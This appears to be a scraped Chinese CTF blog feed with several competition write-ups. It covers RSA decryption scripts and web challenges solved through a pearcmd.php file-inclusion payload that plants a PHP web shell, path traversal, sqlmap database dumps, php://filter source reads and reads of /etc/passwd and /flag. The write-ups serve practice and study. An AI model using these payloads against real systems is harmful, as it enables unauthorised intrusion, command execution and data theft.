<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">p</span> = <span class="hljs-number">98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span><br><span class="hljs-attr">q</span> = <span class="hljs-number">109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span><br></code></pre></td></tr></table></figure>

<p>py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Decrypt</span>(<span class="hljs-params">c,e,p,q</span>):</span><br>	L=(p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)<br>	d=gmpy2.invert(e,L)<br>	n=p*q<br>	m=gmpy2.powmod(c,d,n)<br>	flag=str(m)<br>	print(<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span>)<br>	print(long_to_bytes(m))<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	p = <span class="hljs-number">98076983780120527792770458890688780277555823887994682214163454666075869521826187406254142075354923691219183496475686028848162360931603330874280505123843552372958293491848353122538774273040195483023876976399815394023691848915634977595301613954470455946398168537308640467440726111280710149870545973093090456889</span><br>	q = <span class="hljs-number">109128821261524367993374364036752312900012076309330756131518403621847420955028710012028358702633852630087399851151754849147220171122637334312693362040478478695565880745177002757742893966644802468111652889172842876540303217969414827643680547263729238638892692735875504393903671278190481143453326533644387573461</span><br>	e = <span class="hljs-number">0x10001</span><br>	c = <span class="hljs-number">8696776091045108490706741201669649821552098817481485617853249715695452117022972197749187352644944365460751251101372390508596189150805218655222108412326856187627845335538773557544760562801719469076203277592589287193986370203119805644848355844583928832131820820974656892977022368839425335996903938252794569016614874508025078423755886667955587053802224154129110315695574349620275748114001260456693435229465252466658050265611351185710207338488975143389774529701841231400140833998139253918045998745339223155390778692014423596594980230369885048851010327175679107067569282667999861554443225979013382555032561744321517672718</span><br>	Decrypt(c,e,p,q)<br></code></pre></td></tr></table></figure>

<h4 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h4><p><img src="/2022/02/05/2022/1/rois-%E5%86%AC%E4%BB%A4%E8%90%A5/image-20220205222341034.png" alt="image-20220205222341034"></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">n</span> = <span class="hljs-number">83283614719107534991800643035912480346726823839289209334614767173634111928391</span><br><span class="hljs-attr">c</span> = <span class="hljs-number">70586109384880981913502819444082705449386947354232744667244143211827298034941</span><br></code></pre></td></tr></table></figure>

<p>py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding= utf-8 -*-</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">83283614719107534991800643035912480346726823839289209334614767173634111928391</span><br>c = <span class="hljs-number">70586109384880981913502819444082705449386947354232744667244143211827298034941</span><br><span class="hljs-comment">#1.将n分解为p和q</span><br>p = <span class="hljs-number">284434381548437927107267673531343782677</span><br>q = <span class="hljs-number">292804316643150613089811685591944680683</span><br><br>phi = (p<span class="hljs-number">-1</span>)*(q<span class="hljs-number">-1</span>)<br><span class="hljs-comment">#2.求d</span><br>d = gmpy2.invert(e,phi)<br><span class="hljs-comment">#3.m=pow(c,d,n)</span><br>m = gmpy2.powmod(c,d,n)<br>flag=str(m)<br>print(<span class="hljs-string">&quot;flag&#123;&quot;</span>+flag+<span class="hljs-string">&quot;&#125;&quot;</span>)<br>print(long_to_bytes(m))<br>print(binascii.unhexlify(hex(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#binascii.unhexlify(hexstr):从十六进制字符串hexstr返回二进制数据</span><br><br></code></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>湖湘杯</title>
    <url>/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>没想到直接出了一题找框架漏洞的。。</p>
<p>赛后根据wp复现下，靶机环境为buu</p>
<p>参考文章：<a href="https://mp.weixin.qq.com/s?srcid=11155a0DnDB8fsa6xlkV96EQ&scene=23&sharer_sharetime=1636954278368&mid=2247492365&sharer_shareid=f8efe04553108c0c98c8d775270a22ec&sn=9918645f186a2ef9c11957ed4949c27b&idx=1&__biz=MzU2NDY2OTU4Nw==&chksm=fc45def1cb3257e72196a404a9e9ea9f58d658d9d6fa4acd2a5d20c0fa380af6a2cf510f0b4e&mpshare=1#rd">第七届“湖湘杯”网络安全技能大赛WP (qq.com)</a></p>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117191742538.png" alt="image-20211117191742538"></p>
<p>左上角有一段代码</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117191827188.png" alt="image-20211117191827188"></p>
<p>定义一个类，类中有变量name和value</p>
<p>这里看不出什么大概，于是去官网上下载了一个相近版本的源码</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192036759.png" alt="image-20211117192036759"></p>
<p>接下来就是代码审计</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192235252.png" alt="image-20211117192235252"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">assign</span>(<span class="hljs-params">$name, $value = <span class="hljs-literal">null</span></span>) </span>&#123;<br>	\wiphp\View::assign($name, $value);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在hepler.php中找到name和value作为可控变量，那么这里就是切入点</p>
<p>跟进</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192404636.png" alt="image-20211117192404636"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">assign</span>(<span class="hljs-params">$name, $value = <span class="hljs-literal">null</span></span>) </span>&#123;<br>		<span class="hljs-keyword">if</span> ($name != <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-built_in">self</span>::$vars[$name] = $value;<br>	&#125; <br></code></pre></td></tr></table></figure>

<p>再根据view函数</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192539051.png" alt="image-20211117192539051"></p>
<p>跟进</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192819699.png" alt="image-20211117192819699"></p>
<p>发现变量覆盖</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192920609.png" alt="image-20211117192920609"></p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117192938954.png" alt="image-20211117192938954"></p>
<p>利用漏洞，</p>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">?name=cfile&amp;+config-create+<span class="hljs-regexp">/&amp;value=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;<span class="hljs-regexp">/&lt;?=var_dump(system($_GET[1]));?&gt;+/</span>tmp/xq2.txt<br></code></pre></td></tr></table></figure>

<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193028604.png" alt="image-20211117193028604"></p>
<p>写入之后就是命令执行了</p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193132293.png" alt="image-20211117193132293"></p>
<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193201288.png" alt="image-20211117193201288"></p>
<p>最后</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><code class="hljs dts">?name=cfile<span class="hljs-variable">&amp;value</span>=<span class="hljs-meta-keyword">/tmp/</span>xq2.txt<span class="hljs-variable">&amp;1</span>=cat%<span class="hljs-number">20</span>/flag32897328937298hdwidh<br></code></pre></td></tr></table></figure>

<p><img src="/2021/11/17/2021/ctf/%E6%B9%96%E6%B9%98%E6%9D%AF/image-20211117193320690.png" alt="image-20211117193320690"></p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>陇剑杯复现</title>
    <url>/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/</url>
    <content><![CDATA[<p>当初不太懂得怎么查询</p>
<p>现在来试着复现</p>
<h3 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h3><p><a href="https://www.bilibili.com/video/BV1NE411j72u?p=1">ctf刷题（持续更新中…）（想看哪个题目评论区留言）_哔哩哔哩_bilibili</a></p>
<p>题目</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182557872.png" alt="image-20211019182557872"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182625019.png" alt="image-20211019182625019"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182649070.png" alt="image-20211019182649070"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182723548.png" alt="image-20211019182723548"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182747283.png" alt="image-20211019182747283"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182816165.png" alt="image-20211019182816165"></p>
<p>下载附件</p>
<p>用wireshark打开</p>
<p>第一题较简单，不过我们还是可以验证一下</p>
<p>抓取一个包，分析tcp流</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019182922137.png" alt="image-20211019182922137"></p>
<p>位于右下角到流1时，查看token</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183030189.png" alt="image-20211019183030189"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">token</span>=eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiIsInR<span class="hljs-number">5</span>cCI<span class="hljs-number">6</span>IkpXVCJ<span class="hljs-number">9</span>.eyJpZCI<span class="hljs-number">6</span>MTAwODYsIk<span class="hljs-number">1</span>hcENsYWltcyI<span class="hljs-number">6</span>eyJhdWQiOiJhZG<span class="hljs-number">1</span>pbiIsInVzZXJuYW<span class="hljs-number">1</span>lIjoiYWRtaW<span class="hljs-number">4</span>ifX<span class="hljs-number">0</span>.dJArtwXjas<span class="hljs-number">3</span>_Cg<span class="hljs-number">9</span>a<span class="hljs-number">3</span>tr<span class="hljs-number">8</span>COXF<span class="hljs-number">7</span>DRsuX<span class="hljs-number">8</span>UjmbC<span class="hljs-number">1</span>nKf<span class="hljs-number">8</span>fc<br></code></pre></td></tr></table></figure>

<p>明显得jwt认证，第二题我们解码一下</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183124604.png" alt="image-20211019183124604"></p>
<p>不懂为什么这里我得出来得id是10086，答案是10087，username正确就是admin</p>
<p>继续往下翻</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183402206.png" alt="image-20211019183402206"></p>
<p>权限就是root</p>
<p>观察</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183444748.png" alt="image-20211019183444748"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183501763.png" alt="image-20211019183501763"></p>
<p>开始base64编码的输出了</p>
<p>看到1.c，这就是上传文件</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183544100.png" alt="image-20211019183544100"></p>
<p>接下来就直接找so文件</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183654236.png" alt="image-20211019183654236"></p>
<p>找到了looter.so</p>
<p>最后找到绝对路径</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019183809606.png" alt="image-20211019183809606"></p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>题目：</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185213358.png" alt="image-20211019185213358"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185231844.png" alt="image-20211019185231844"></p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185254230.png" alt="image-20211019185254230"></p>
<p>第一题以为是被读取源文件，结果是下载源码==</p>
<p>后面两题分析到了</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185002707.png" alt="image-20211019185002707"></p>
<p>url解码</p>
<p><img src="/2021/10/19/2021/ctf/%E9%99%87%E5%89%91%E6%9D%AF/image-20211019185050316.png" alt="image-20211019185050316"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">URL</span><br><span class="hljs-attribute">GET</span> /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">16</span>:<span class="hljs-string">&quot;./files/filename&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;call_user_func_array&quot;</span>;s:<span class="hljs-number">28</span>:<span class="hljs-string">&quot;./files/call_user_func_array&quot;</span>;&#125;paths|a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>

<p>剩余题目再看<a href="https://www.cnblogs.com/twosmi1e/p/15370801.html">你终于回来了(。・∀・)ノ (cnblogs.com)</a>分析</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>鲲鹏杯小结</title>
    <url>/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/</url>
    <content><![CDATA[<p> 这次鲲鹏杯收获还是挺多的，虽然很多题目都是原题</p>
<p> 直接上网搜索复现了一下，记录一下思路解法</p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="1-贪吃蛇"><a href="#1-贪吃蛇" class="headerlink" title="1.贪吃蛇"></a>1.贪吃蛇</h4><p><a href="https://www.it610.com/article/1282297809499865088.htm">https://www.it610.com/article/1282297809499865088.htm</a></p>
<p>考察知识点：js</p>
<p>通过扫描目录</p>
<p>得到源码有个<code>snake.js</code></p>
<p>有如下代码：</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211020163904150.png" alt="image-20211020163904150"></p>
<p>丢进网站解码：<a href="https://www.qtool.net/decode">jjencode与aaencode解密工具-jjencode解密-aaencode解密-在线工具 (qtool.net)</a></p>
<p>或者复制下来到控制台进行直接解码</p>
<p>我这里是用chrome</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/buu/22/image-20211021095426486.png" alt="image-20211021095426486"></p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/buu/22/image-20211021095454062.png" alt="image-20211021095454062"></p>
<p>点下最右边的报错信息就可以得到flag了</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/buu/22/image-20211021095529874.png" alt="image-20211021095529874"></p>
<h4 id="2-sql"><a href="#2-sql" class="headerlink" title="2.sql"></a>2.sql</h4><p>这题sqlmap不太会用，导致前面手工注入很久也不知道是sleep注入</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> <span class="hljs-params">--dbs</span><br>sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span><br>sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span> -T<br>db_news<br>sqlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span> -T<br>db_news <span class="hljs-params">--columns</span><br>qlmap -u <span class="hljs-string">&quot;http://172.31.65.174/search.jsp?keyname=&quot;</span> -D attackdb <span class="hljs-params">--tables</span> -T<br>db_news <span class="hljs-params">--columns</span> -C flag <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105539333.png" alt="image-20211021105539333"></p>
<h4 id="3-工控（伪协议）"><a href="#3-工控（伪协议）" class="headerlink" title="3.工控（伪协议）"></a>3.工控（伪协议）</h4><p>这题本来感觉很眼熟，以为是在攻防世界里写的题目</p>
<h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>结果不是，过了了base64读取源码</p>
<p>后来搜到原题，原来要rot13才行</p>
<p>思路：打开靶机后，跳转页面，来到工控XX，url上有参数page</p>
<p>试着改参数值，想起可以php伪协议读取，这里只能用rot13编码读取</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=string.rot13/</span>resource=index.php<br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/0.jpg" alt="在这里插入图片描述"></p>
<p>然后就可以f12去看rot13编码的源码内容</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/2.jpg" alt="在这里插入图片描述"></p>
<p>解码<a href="https://www.ssleye.com/ctf/rot13.html">https://www.ssleye.com/ctf/rot13.html</a></p>
<p><img src="https://img-blog.csdnimg.cn/7f1d725c86b042e284b1855d8653fd31.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIyMTYwNTU3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>$page = $_get[<span class="hljs-string">&#x27;page&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($page)) &#123;<br><br><br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/^.+base.+$/&quot;</span>,$page)) &#123;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $page; <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;/br&gt;not base&quot;</span>);<span class="hljs-meta">?&gt;</span><br> <span class="hljs-meta">&lt;?php</span><br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><br>            <span class="hljs-keyword">if</span> ($page === <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ok&#x27;</span>);<br>            &#125;<br>            <span class="hljs-keyword">include</span>($page);<br>            <span class="hljs-keyword">die</span>();<br>            <span class="hljs-meta">?&gt;</span><br><br>        <span class="hljs-meta">&lt;?php</span><br>        &#125;&#125;<br><br><br>    $hashed_key = <span class="hljs-string">&#x27;df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b&#x27;</span>;<br>    $parsed = parse_url($_server[<span class="hljs-string">&#x27;request_uri&#x27;</span>]);<br>    $query = $parsed[<span class="hljs-string">&quot;query&quot;</span>];<br>    $parsed_query = parse_str($query);<br>    <span class="hljs-keyword">if</span>($parsed_query!=<span class="hljs-literal">null</span>)&#123;<br>        $action = $parsed_query[<span class="hljs-string">&#x27;action&#x27;</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>($action===<span class="hljs-string">&quot;auth&quot;</span>)&#123;<br>        $key = $_get[<span class="hljs-string">&quot;key&quot;</span>];<br>        $hashed_input = hash(<span class="hljs-string">&#x27;sha384&#x27;</span>, $key);<br>        <span class="hljs-comment">//echo $hashed_input.&#x27;\n&#x27;;</span><br>        <span class="hljs-keyword">if</span>($hashed_input!==$hashed_key)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no way to get flag!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<br>        <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021103907127.png" alt="image-20211021103907127"></p>
<p>刚刚的本地复现过程：</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105705687.png" alt="image-20211021105705687"></p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105729371.png" alt="image-20211021105729371"></p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021105803190.png" alt="image-20211021105803190"></p>
<h5 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h5><p>看了wp，原来这个任意文件读取漏洞可以这样利用</p>
<p>首先是/etc/passwd</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021102828034.png" alt="image-20211021102828034"></p>
<p>然后猜测flag在根目录下，直接读取</p>
<p>/flag</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021102917782.png" alt="image-20211021102917782"></p>
<h4 id="4-100块都不给我"><a href="#4-100块都不给我" class="headerlink" title="4.100块都不给我"></a>4.100块都不给我</h4><p>打开页面</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110550654.png" alt="image-20211021110550654"></p>
<p>试着查看robots.txt文件</p>
<p>果然有东西</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110636689.png" alt="image-20211021110636689"></p>
<p>访问index.php1</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110731161.png" alt="image-20211021110731161"></p>
<p>看到变量a是可控参数</p>
<p>直接phpinfo</p>
<p><img src="/2021/10/17/2021/ctf/%E9%B2%B2%E9%B9%8F%E6%9D%AF/image-20211021110911424.png" alt="image-20211021110911424"></p>
<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>思路：打开是一张报错的图片</p>
<p>接着010查看发现提示base64</p>
<p>这边我以为要再去解码</p>
<p>结果考点是url访问得到的图片路径即可</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">data</span>:image/png;base<span class="hljs-number">64</span>,iVBORw<span class="hljs-number">0</span>KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAYmUlEQVR<span class="hljs-number">4</span>Xu<span class="hljs-number">2</span>d<span class="hljs-number">0</span>XbcSA<span class="hljs-number">5</span>D<span class="hljs-number">4</span>///<span class="hljs-number">6</span>OzpnCQ<span class="hljs-number">7</span>jt<span class="hljs-number">2</span>NK<span class="hljs-number">9</span>VtuuRGXosCQZCES<span class="hljs-number">4</span><span class="hljs-literal">on</span><span class="hljs-number">8</span>/bjx<span class="hljs-number">4</span>+fP<span class="hljs-number">17</span>sz<span class="hljs-number">8</span>+fTslvb<span class="hljs-number">29</span>ROZKL<span class="hljs-number">4</span>MREgwGkpkRnsmbCd<span class="hljs-number">5</span>JP<span class="hljs-number">0</span>mby/DbBzjZMsl<span class="hljs-number">7</span>MRQaCpCBDQ<span class="hljs-number">3</span>IRHMJnKobUlLhM<span class="hljs-number">1</span>kz<span class="hljs-number">4</span>TvJJ<span class="hljs-number">2</span>kye<span class="hljs-number">1</span>wAW<span class="hljs-number">1</span>CZD<span class="hljs-number">8</span>x<span class="hljs-number">2</span>Hj<span class="hljs-number">9</span>SUZCXaJQx<span class="hljs-number">6</span>TvhO<span class="hljs-number">8</span>qG<span class="hljs-number">8</span>J+JqAAsqk<span class="hljs-number">6</span>H<span class="hljs-number">5</span>jsNHakqyEu<span class="hljs-number">0</span>SBj<span class="hljs-number">0</span>nfCf<span class="hljs-number">5</span>UN<span class="hljs-number">4</span>TcTWABZXJ<span class="hljs-number">0</span>HzH<span class="hljs-number">4</span>SM<span class="hljs-number">1</span>JVmJdgmDnhO+k<span class="hljs-number">3</span>wo<span class="hljs-number">74</span>m<span class="hljs-number">4</span>GsCCymRovuPwkZqSrES<span class="hljs-number">7</span>hEHPCd<span class="hljs-number">9</span>JPpT<span class="hljs-number">3</span>RFwNYEFlMjTfcfhITUlWol<span class="hljs-number">3</span>CoOeE<span class="hljs-number">7</span>yQfynsirgawoDIZmu<span class="hljs-number">84</span>fKSmJCvRLmHQc<span class="hljs-number">8</span>J<span class="hljs-number">3</span>kg/lPREXDYCIN<span class="hljs-number">0</span>GU<span class="hljs-number">5</span>iCNtGoiuQjvxMfKQ<span class="hljs-number">7</span>hYMakmKw/RhnCxcKy<span class="hljs-number">6</span>DBxSUw<span class="hljs-number">1</span>gQWkiMIFPA<span class="hljs-number">2</span>rlIVysmFSTlYdoQ<span class="hljs-number">7</span>hYOFZdBg<span class="hljs-number">6</span>pqQawoDQRmMCnAbXyEC<span class="hljs-number">5</span>WTKrJykO<span class="hljs-number">0</span>IVwsHKsuA<span class="hljs-number">4</span>fUVANYUJoITODTgFp<span class="hljs-number">5</span>CBcrJtVk<span class="hljs-number">5</span>SHaEC<span class="hljs-number">4</span>WjlWXgUNqqgEsKE<span class="hljs-number">0</span>EJvBpQK<span class="hljs-number">08</span>hIsVk<span class="hljs-number">2</span>qy<span class="hljs-number">8</span>hBtCBcLx<span class="hljs-number">6</span>rLwCE<span class="hljs-number">11</span>QAWlCYCE/g<span class="hljs-number">0</span>oFYewsWKSTVZeYg<span class="hljs-number">2</span>hIuFY<span class="hljs-number">9</span>Vl<span class="hljs-number">4</span>JCaagALShOBCXwaUCsP<span class="hljs-number">4</span>WLFpJqsPEQbwsXCseoycEhNNYAFpYnABD<span class="hljs-number">4</span>NqJWHcLFiUk<span class="hljs-number">1</span>WHqIN<span class="hljs-number">4</span>WLhWHUZOKSmGsCC<span class="hljs-number">0</span>kRgAp<span class="hljs-number">8</span>G<span class="hljs-number">1</span>MpDuFgxqSYrD<span class="hljs-number">9</span>GGcLFwrLoMHFKTYgAkkVHQDSM<span class="hljs-number">1</span>k<span class="hljs-number">3</span>BJGLc<span class="hljs-number">8</span>O+EQLkTfyboTH<span class="hljs-number">6</span>umlIfMjNXvK<span class="hljs-number">9</span>ZUA<span class="hljs-number">7</span>gzQaSZUwtFuOy<span class="hljs-number">0</span>CISLVRPJdbU+TdZUA<span class="hljs-number">6</span>gBvFOALCZZqDTEJE/CoOeEL+GTcAgG<span class="hljs-number">5</span>ZziEhd<span 